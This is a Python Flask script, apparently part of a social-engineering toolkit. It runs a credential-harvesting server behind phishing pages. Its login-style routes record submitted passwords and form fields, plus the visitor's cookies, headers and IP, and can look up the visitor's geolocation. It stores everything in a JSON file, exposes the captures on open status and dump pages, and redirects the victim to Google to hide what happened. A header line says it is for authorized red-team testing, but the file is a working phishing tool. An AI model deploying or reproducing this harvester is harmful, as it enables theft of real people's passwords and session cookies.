#!/usr/bin/env python3
"""
=============================================================================
  credential_harvester.py — Advanced credential harvesting server
  Part of: PARALELEPIPEDO // SocialEngineering
  Author : PARALELEPIPEDO project
  Use    : Authorized red-team / security-awareness testing only
=============================================================================
  Deps: flask, rich, colorama
        pip install flask rich colorama
=============================================================================
"""

import argparse
import json
import os
import sys
import time
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path

from colorama import Fore, Style, init as colorama_init
from flask import Flask, request, jsonify, render_template_string, redirect
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

colorama_init(autoreset=True)
console = Console()

BASE_DIR = Path(__file__).parent
LOG_FILE  = BASE_DIR / "harvested.json"

app       = Flask(__name__)
captures  = []
args_g    = None

# ─── Rate limiter ─────────────────────────────────────────────────────────────

_rate: dict = defaultdict(list)

def rate_check(ip: str, limit: int = 30, window: int = 60) -> bool:
    """Return True if the IP has exceeded the limit."""
    now = time.time()
    _rate[ip] = [t for t in _rate[ip] if now - t < window]
    if len(_rate[ip]) >= limit:
        return True
    _rate[ip].append(now)
    return False


# ─── Notification ─────────────────────────────────────────────────────────────

def notify(entry: dict):
    """Print a rich alert panel and optionally beep."""
    geo = entry.get("geo", {})
    loc = f"{geo.get('city','?')}, {geo.get('country','?')}" if geo else "unknown"
    panel = Panel(
        f"[bold]Route     :[/] {entry.get('route','/')}\n"
        f"[bold]IP        :[/] [cyan]{entry.get('ip','')}[/]  ({loc})\n"
        f"[bold]UA        :[/] {entry.get('user_agent','')[:80]}\n"
        f"[bold]Fields    :[/] {json.dumps(entry.get('fields', {}), ensure_ascii=False)}",
        title="[bold red]⚡ CREDENTIAL CAPTURED[/]",
        border_style="bright_red",
    )
    console.print(panel)
    # Cross-platform bell
    try:
        sys.stdout.write("\a")
        sys.stdout.flush()
    except Exception:
        pass


# ─── Persistence ──────────────────────────────────────────────────────────────

def persist(entry: dict):
    captures.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(captures, f, indent=2, default=str)


# ─── Generic capture handler ──────────────────────────────────────────────────

def handle_capture(route: str):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    if rate_check(ip, limit=args_g.rate_limit):
        console.print(f"[yellow]Rate limited:[/] {ip}")
        return jsonify({"error": "rate limited"}), 429

    # Parse body — support form, JSON, raw query-string
    fields: dict = {}
    if request.is_json:
        body = request.get_json(silent=True) or {}
        fields = {k: v for k, v in body.items()}
    elif request.form:
        fields = dict(request.form)
        # Flatten single-value lists
        fields = {k: (v[0] if isinstance(v, list) and len(v) == 1 else v)
                  for k, v in fields.items()}
    elif request.data:
        try:
            fields = json.loads(request.data.decode())
        except Exception:
            fields = {"raw": request.data.decode(errors="replace")}

    # Also capture query params
    query = dict(request.args)
    if query:
        fields["_query"] = query

    entry = {
        "timestamp"  : datetime.now(timezone.utc).isoformat(),
        "route"      : route,
        "ip"         : ip,
        "user_agent" : request.headers.get("User-Agent", ""),
        "referer"    : request.headers.get("Referer", ""),
        "cookies"    : dict(request.cookies),
        "headers"    : dict(request.headers),
        "fields"     : fields,
        "geo"        : {},
    }

    # Optional geo
    if args_g.geo:
        try:
            import requests as req
            r = req.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp",
                        timeout=3)
            if r.status_code == 200:
                entry["geo"] = r.json()
        except Exception:
            pass

    notify(entry)
    persist(entry)

    redir = args_g.redirect or "https://www.google.com"
    return redirect(redir)


# ─── Route registration ───────────────────────────────────────────────────────

def register_routes(routes: list[str]):
    for route in routes:
        # Flask requires unique endpoint names
        ep = "capture_" + route.strip("/").replace("/", "_") or "capture_root"
        app.add_url_rule(
            route,
            endpoint=ep,
            view_func=lambda r=route: handle_capture(r),
            methods=["GET", "POST"],
        )


# ─── Status page ──────────────────────────────────────────────────────────────

STATUS_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Harvester Status</title>
<style>
  body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px}
  h1{color:#f85149} table{border-collapse:collapse;width:100%}
  th,td{border:1px solid #30363d;padding:8px;text-align:left}
  th{background:#161b22;color:#58a6ff}
</style></head><body>
<h1>⚡ Harvester — {{ count }} captures</h1>
<table>
<tr><th>Time</th><th>IP</th><th>Route</th><th>Fields</th></tr>
{% for c in captures %}
<tr>
  <td>{{ c.timestamp }}</td>
  <td>{{ c.ip }}</td>
  <td>{{ c.route }}</td>
  <td><pre>{{ c.fields | tojson(indent=2) }}</pre></td>
</tr>
{% endfor %}
</table></body></html>"""


@app.route("/__status__")
def status_page():
    return render_template_string(STATUS_HTML, captures=captures[-100:],
                                  count=len(captures))


@app.route("/__dump__")
def dump_json():
    return jsonify(captures)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    global args_g

    parser = argparse.ArgumentParser(
        description="Advanced credential harvesting server",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--host",       default="0.0.0.0")
    parser.add_argument("--port",       type=int, default=8081)
    parser.add_argument("--routes",     nargs="+",
                        default=["/login", "/signin", "/capture",
                                 "/submit", "/auth"],
                        help="Routes that trigger credential capture")
    parser.add_argument("--redirect",   metavar="URL",
                        help="URL to redirect after capture")
    parser.add_argument("--log",        default=str(LOG_FILE))
    parser.add_argument("--rate-limit", type=int, default=30,
                        dest="rate_limit",
                        help="Max requests per IP per 60s")
    parser.add_argument("--geo",        action="store_true",
                        help="Resolve geo info via ip-api.com")
    args_g = parser.parse_args()

    global LOG_FILE
    LOG_FILE = Path(args_g.log)

    register_routes(args_g.routes)

    console.print(Panel(
        f"[bold]Routes     :[/] {', '.join(args_g.routes)}\n"
        f"[bold]Listen     :[/] http://{args_g.host}:{args_g.port}\n"
        f"[bold]Status     :[/] http://{args_g.host}:{args_g.port}/__status__\n"
        f"[bold]Dump JSON  :[/] http://{args_g.host}:{args_g.port}/__dump__\n"
        f"[bold]Rate limit :[/] {args_g.rate_limit} req/min/IP\n"
        f"[bold]Geo lookup :[/] {'yes' if args_g.geo else 'no'}\n"
        f"[bold]Log file   :[/] {LOG_FILE}",
        title="[bold red]⚡ Credential Harvester[/]",
        border_style="red",
    ))

    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    app.run(host=args_g.host, port=args_g.port, debug=False)


if __name__ == "__main__":
    main()
